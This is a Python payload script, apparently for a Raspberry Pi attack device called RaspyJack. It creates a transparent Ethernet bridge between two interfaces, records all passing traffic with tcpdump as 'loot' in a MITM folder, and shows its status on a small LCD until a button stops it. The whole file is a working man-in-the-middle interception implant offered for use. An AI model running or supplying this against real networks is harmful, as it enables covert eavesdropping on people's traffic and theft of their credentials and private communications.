#!/usr/bin/env python3
"""
RaspyJack Payload – Transparent Ethernet MITM Bridge
↪ Creates a passive bridge between eth0 and eth1
↪ Captures all traffic to /root/Raspyjack/loot/MITM/
↪ Stops cleanly on KEY3
↪ Verifies dependencies & interfaces before starting
"""

import os, sys, signal, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import shutil
from datetime import datetime
import RPi.GPIO as GPIO
import LCD_1in44
from LCD_1in44 import LCD
from LCD_Config import *
from PIL import Image, ImageDraw, ImageFont

PINS = { "KEY3": 16 }

lcd = LCD()
lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
font = ImageFont.load_default()

def draw(text: str):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    lines = text.splitlines()
    for i, line in enumerate(lines):
        if hasattr(d, "textbbox"):
            x0, y0, x1, y1 = d.textbbox((0, 0), line, font=font)
            w, h = x1 - x0, y1 - y0
        else:
            w, h = d.textsize(line, font=font)

        pos = ((WIDTH - w) // 2, ((HEIGHT - len(lines)*h) // 2) + i*h)
        d.text(pos, line, font=font, fill="#00FF00")
    lcd.LCD_ShowImage(img, 0, 0)

def setup_gpio():
    GPIO.setmode(GPIO.BCM)
    GPIO.setup(PINS["KEY3"], GPIO.IN, pull_up_down=GPIO.PUD_UP)

def wait_key3():
    while GPIO.input(PINS["KEY3"]) == 1:
        time.sleep(0.1)

def cleanup():
    subprocess.run(["ip", "link", "set", "br0", "down"], stdout=subprocess.DEVNULL)
    subprocess.run(["brctl", "delbr", "br0"], stdout=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", "eth0", "down"], stdout=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", "eth1", "down"], stdout=subprocess.DEVNULL)
    lcd.LCD_Clear()
    GPIO.cleanup()

def check_dependencies():
    required = ["brctl", "tcpdump", "ip"]
    for cmd in required:
        if shutil.which(cmd) is None:
            draw(f"Missing: {cmd}\nInstall required\ndependencies.")
            time.sleep(5)
            sys.exit(1)

def check_interfaces():
    result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
    interfaces = result.stdout
    if "eth0:" not in interfaces or "eth1:" not in interfaces:
        draw("eth0 or eth1\nnot found.\nCheck connections.")
        time.sleep(5)
        sys.exit(1)

def create_bridge():
    subprocess.run(["ip", "link", "set", "eth0", "down"])
    subprocess.run(["ip", "link", "set", "eth1", "down"])
    subprocess.run(["brctl", "addbr", "br0"])
    subprocess.run(["brctl", "addif", "br0", "eth0"])
    subprocess.run(["brctl", "addif", "br0", "eth1"])
    subprocess.run(["ip", "link", "set", "eth0", "up"])
    subprocess.run(["ip", "link", "set", "eth1", "up"])
    subprocess.run(["ip", "link", "set", "br0", "up"])

def start_sniffer():
    loot_dir = "/root/Raspyjack/loot/MITM"
    os.makedirs(loot_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%Hh%Mm%Ss")
    pcap_file = f"{loot_dir}/mitm_{ts}.pcap"
    proc = subprocess.Popen(["tcpdump", "-i", "br0", "-w", pcap_file])
    return proc, pcap_file

# ────────────────────────────────────────────────────────────────

try:
    setup_gpio()
    draw("Checking system...")
    check_dependencies()
    check_interfaces()
    time.sleep(2)

    draw("Setting up bridge")
    create_bridge()
    time.sleep(2)

    draw("Starting sniffer...")
    time.sleep(2)
    sniffer, output = start_sniffer()
    draw("Sniffing traffic...\nPress KEY3 to stop")

    wait_key3()

    draw("Stopping capture...")
    sniffer.terminate()
    sniffer.wait()
    time.sleep(2)

finally:
    cleanup()
